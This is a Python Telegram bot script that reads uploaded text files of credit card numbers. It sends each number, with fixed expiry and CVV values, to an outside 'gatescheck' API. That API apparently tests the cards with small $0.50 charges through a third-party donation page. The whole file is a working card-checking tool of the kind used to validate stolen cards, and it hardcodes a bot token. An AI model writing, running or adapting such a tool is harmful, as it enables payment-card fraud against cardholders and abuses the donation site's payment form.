import os
import re
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Your bot token
TOKEN = '8692960014:AAEpYPo0XTj8F2DmAeUgdaf9_w06MWFYDeI'

# API URL for card verification
API_URL = "http://gatescheck.duckdns.org:7000/check"

# Function to verify card status via API
def check_card_api(card_number):
    params = {
        "url": "https://raybensch.com/donations/support-ray/",
        "card": f"{card_number}|09|28|092",
        "amount": 0.50
    }
    try:
        response = requests.get(API_URL, params=params)
        result = response.json().get('result', 'Unknown')
        return result
    except Exception as e:
        return f"Verification error: {e}"

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        # Ensure 'downloads' folder exists
        if not os.path.exists('downloads'):
            os.makedirs('downloads')

        file = await update.message.document.get_file()
        file_path = f"downloads/{file.file_id}.txt"
        await file.download_to_drive(file_path)

        # Read file and verify cards
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()

        for line in lines:
            line = line.strip()
            card_number_matches = re.findall(r'\d+', line)
            if card_number_matches:
                card_number = card_number_matches[0]
                result = check_card_api(card_number)
                await update.message.reply_text(f"Card: {line} - Result: {result}")
            else:
                await update.message.reply_text(f"No card number found in line: {line}")

    except Exception as e:
        await update.message.reply_text(f"Error processing file: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text('Hello! Send me a text file to verify credit cards.')

def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))

    app.run_polling()

if __name__ == '__main__':
    main()
